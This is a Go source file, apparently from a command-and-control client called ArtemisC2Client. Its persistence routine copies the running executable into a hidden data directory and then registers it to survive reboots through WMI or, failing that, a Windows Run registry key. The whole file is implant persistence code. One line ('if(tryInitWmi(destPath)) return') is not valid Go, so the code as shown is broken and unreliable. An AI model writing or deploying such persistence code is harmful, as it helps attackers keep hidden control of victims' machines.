//go:build !debug

package persistence

import (
	"io"
	"os"
	"path/filepath"
	"github.com/desertcod98/ArtemisC2Client/config"
)

func TryInit() {
	exePath, err := os.Executable()
	if err != nil{
		return
	}
	destDir := config.GetDataDir()
	os.MkdirAll(destDir, 0700)
	destPath := filepath.Join(destDir, filepath.Base(exePath))
	if exePath != destPath {
		src, err1 := os.Open(exePath)
		if err1 == nil {
			defer src.Close()
			dst, err2 := os.Create(destPath)
			if err2 == nil {
				defer dst.Close()
				io.Copy(dst, src)
			}
		}
	}
	
	if(tryInitWmi(destPath)) return
	tryInitRunkey()
}
